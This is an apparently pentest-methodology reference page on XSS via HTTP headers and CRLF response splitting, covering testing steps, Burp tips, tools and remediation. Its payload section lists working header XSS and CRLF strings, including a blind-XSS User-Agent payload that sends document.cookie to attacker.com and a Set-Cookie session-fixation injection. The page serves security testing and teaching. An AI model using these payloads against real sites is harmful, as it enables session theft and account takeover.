# XSS via HTTP Response Headers

## Overview
XSS via HTTP response headers occurs when attacker-controlled data from request headers is reflected unsanitized into HTTP response headers or into the response body, enabling script execution. Common vectors include the `Referer`, `User-Agent`, `X-Forwarded-For`, and `Origin` request headers being logged and displayed in admin interfaces, or server-generated response headers that incorporate request data without encoding. A secondary scenario involves misconfigured or injected response headers — such as `Location`, `Content-Type`, or custom headers — that allow script injection through header injection (CRLF injection).

## How It Works
**Reflection in body**: Request headers are often logged by the server and displayed in admin panels, error pages, or debugging endpoints without encoding. An attacker submits a crafted `User-Agent` or `X-Forwarded-For` containing an XSS payload; when an admin views the logs, the payload executes in their browser.

**Header Injection / CRLF**: If a response header value is constructed from user input and the application fails to strip carriage return (`\r`, `%0d`) and line feed (`\n`, `%0a`) characters, an attacker can inject new response headers. By injecting a `Content-Type: text/html` header followed by a blank line and then a body, the attacker can create a complete HTTP response with executable content — effectively turning any response into an HTML page with JavaScript.

## Impact
- Blind XSS in admin panels via crafted User-Agent/Referer headers
- Session fixation via injected `Set-Cookie` headers (from CRLF injection)
- Cache poisoning by injecting headers into cached responses
- Reflected XSS via headers echoed into response body
- Open redirect via injected `Location` headers
- HTTP response splitting for delivering arbitrary content to victims

## Where to Look
- Error pages and debug pages that display request details including headers
- Admin log viewers showing raw HTTP request logs
- `Location` redirect headers built from request parameters or headers
- Response headers that include request `Origin` values without validation
- Custom headers (`X-Custom-*`) reflected in responses
- Server-side analytics and tracking that echo request metadata
- `Content-Disposition` and `Content-Type` response headers built from filenames or MIME types in requests
- `Link` and `Access-Control-Allow-Origin` response headers built from request `Origin`

## Testing Steps
1. Identify all request headers the application reads — start with standard ones: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`, `Origin`, `Accept-Language`.
2. Submit a unique probe string in each header and search all responses (including admin panels if accessible) for the reflected value.
3. Test for CRLF injection by inserting `%0d%0a` in URL parameters and headers; look for new headers in the response.
4. Check the `Location` redirect header when following redirects — does it include user input unencoded?
5. Test the `Origin` header value — is it reflected in `Access-Control-Allow-Origin` verbatim?
6. For each reflection point, craft an XSS payload appropriate to the context.
7. For header injection, attempt to inject a body and `Content-Type: text/html` after the injected headers.
8. Test for blind XSS in headers by using an OOB callback payload in `User-Agent` and `Referer`.

## Payloads / Techniques

**User-Agent XSS (reflected in body or admin panel):**
```
User-Agent: <script>alert(1)</script>
User-Agent: "><img src=x onerror=alert(document.domain)>
User-Agent: Mozilla/5.0 <svg onload=alert(1)>
```

**Referer header XSS:**
```
Referer: https://attacker.com/"><script>alert(1)</script>
```

**X-Forwarded-For:**
```
X-Forwarded-For: 127.0.0.1"><script>alert(1)</script>
```

**CRLF injection in URL parameter:**
```
GET /redirect?url=https://victim.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

**CRLF in Location header (injecting Set-Cookie):**
```
GET /redirect?next=https://victim.com%0d%0aSet-Cookie:%20sessionid=attacker;%20Path=/
```

**CRLF injection to inject full HTML body:**
```
%0d%0aContent-Length:%2035%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>
```

**Origin header reflected in CORS response:**
```bash
curl -H "Origin: https://attacker.com" https://victim.com/api/data
# If response includes: Access-Control-Allow-Origin: https://attacker.com
# And Access-Control-Allow-Credentials: true
# => CORS misconfiguration, not direct XSS but data theft possible
```

**cURL testing User-Agent reflection:**
```bash
curl -s -H 'User-Agent: XSSTEST"><script>alert(1)</script>' \
     https://victim.com/page | grep -i 'xsstest'
```

**cURL testing CRLF injection:**
```bash
curl -i 'https://victim.com/redirect?url=https://victim.com%0d%0aInjected-Header:%20evil'
# Check if "Injected-Header: evil" appears in response headers
```

**Blind XSS via User-Agent (OOB):**
```
User-Agent: "><script>fetch('https://attacker.com/?h='+btoa(document.cookie))</script>
```

## Burp Suite Tips
- Use **Proxy > Options > Match and Replace** to automatically inject XSS payloads into `User-Agent` and `Referer` headers for all requests in scope.
- In **Repeater**, manually modify headers and observe whether the values appear in response headers or body.
- Use the **CRLF Injection Scanner** (available as a Burp extension) to automate detection of header injection points.
- Check **HTTP history** response headers for any values derived from request input.
- Use **Burp Intruder** to fuzz a list of header names and XSS payloads simultaneously.
- In Burp's **Decoder**, encode payloads with URL encoding (`%0d%0a` for CRLF) to test injection through URL parameters.
- Use **Burp Collaborator** in the User-Agent for blind OOB detection without needing admin access.
- The **Param Miner** extension can discover headers the server processes but are not typically seen in normal traffic.

## Tools
- Burp Suite Pro (Match & Replace, Repeater, Intruder)
- Param Miner (Burp extension) — for header discovery
- CRLF-Injection-Scanner — https://github.com/MichaelStott/CRLF-Injection-Scanner
- crlfuzz — https://github.com/dwisiswant0/crlfuzz
- ffuf (with `-H` flag for header fuzzing)
- curl (manual header manipulation)
- XSS Hunter / interactsh (for blind OOB payloads in headers)

## Remediation
- **Strip CRLF characters**: Reject or strip `\r` and `\n` from any user-supplied data before it is used to construct HTTP response headers.
- **Encode header values**: If request data must appear in a response header, encode it appropriately for the header context.
- **Avoid reflecting headers in responses**: Do not echo request headers (User-Agent, IP, Referer) in response headers or body without encoding.
- **Sanitize log displays**: When rendering logs in admin panels or debug pages, HTML-encode all values including header data.
- **Validate Origin header**: For CORS, maintain an explicit allowlist of permitted origins rather than reflecting the request Origin back verbatim.
- **Use security headers**: Deploy `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and a strict CSP to limit exploitability even if reflection occurs.
- **Framework-level protection**: Use web framework built-ins for redirects rather than building `Location` headers from raw user input.

## References
https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning
https://owasp.org/www-community/attacks/HTTP_Response_Splitting
https://portswigger.net/kb/issues/00200200_http-header-injection
https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
https://portswigger.net/web-security/cross-site-scripting
